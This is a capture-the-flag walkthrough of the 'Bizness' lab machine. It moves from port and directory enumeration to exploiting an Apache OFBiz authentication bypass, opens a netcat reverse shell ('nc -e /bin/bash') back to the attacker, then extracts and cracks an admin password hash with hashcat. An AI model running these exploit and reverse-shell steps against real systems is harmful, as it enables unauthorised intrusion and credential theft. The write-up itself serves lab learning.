# Bizness 

First we start enumerating with nmap, lets take a closer look to the ports.

```bash
sudo nmap --open --min-rate 5000 -Pn -sS 10.10.11.252 -oN ports
```

After the scan we see that *22, 80, 443* ports are open so we proceed with a futher scanning on those ports.

```bash
sudo nmap -sVC -p22,80,443 10.10.11.252 -oN scan
```

As usual we see that port 22 is running on *OpenSSH*, 80, 443 are running on *HTTP* so lets take a closer look to *https://bizness.htb/* because nmap reported its running on port 80.

It doesn't load so maybe it's virtual hosting, lets try addint it to our machine.

```bash
sudo echo "10.10.11.252 bizness.htb" >> /etc/hosts
```

It seems a pretty normal website, there is a few forms but nothing interesting, the email one tries to post something but its handleded by a REGEX so there is nothing to do with it.

## Gobuster

Lets try to enumerate subdomains so we can find something interesting.

We try at first to enumerate all responses but we get an error, so let's try it removing response 302.

```bash
sudo gobuster dir -u https://bizness.htb/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -k -b 302 
```

Gobuster reports

```bash
/META-INF             (Status: 404) [Size: 682]
/WEB-INF              (Status: 404) [Size: 682]
/control              (Status: 200) [Size: 34633]
/index.html           (Status: 200) [Size: 27200]
/meta-inf             (Status: 404) [Size: 682]
/select               (Status: 404) [Size: 757]
/web-inf              (Status: 404) [Size: 682]
```

Let's take a further look on */control*.


It displays an error message

> org.apache.ofbiz.webapp.control.RequestHandlerException: Unknown request [null]; this request does not exist or cannot be called directly.

So we make a simple google search on it

> org.apache.ofbiz.webapp.control.RequestHandlerException vulnerabilities

We find this article 

[CVE-2023-49070 - How it works / Requirements](https://www.vicarius.io/vsociety/posts/apache-ofbiz-authentication-bypass-vulnerability-cve-2023-49070-and-cve-2023-51467)


[CVE-2023-49070 - Exploit](https://www.vicarius.io/vsociety/posts/apache-ofbiz-authentication-bypass-vulnerability-cve-2023-49070-and-cve-2023-51467-exploit)


Lets try it out.

# Requirements

* Install java with the script `./javainstall.sh`
* [ysoserial-all.jar](https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar)

```bash
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar
```


# Exploit

After a while we found someone made the script for OFBiz

[Apache-OFBiz-Authentication-Bypass](https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass.git)

```bash
python3 exploit.py --url https://bizness.htb --cmd 'nc -e /bin/bash <your_ip> <your_prefered_port>'

# And don't forget to listen to your port

nc -lnvp <your_prefered_port>
```


With

```bash
ofbiz@bizness:$ cat /opt/ofbiz/runtime/data/derby/ofbiz/seg0/c6650.dat
``` 

We find, so lets try to test it out on the decript the hash

admin$"$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2IYNN

Lets use

[CyberChef](https://gchq.github.io/CyberChef/)

To sanitize our key **uP0_QaVBpDWFeo8-dRzDqRwXQ2IYNN**

hashcat -m 120 -a 0 -d 1 "b8fd3f41a541a435857a8f3e751cc3a91c1743621834:d" /usr/share/wordlists/rockyou.txt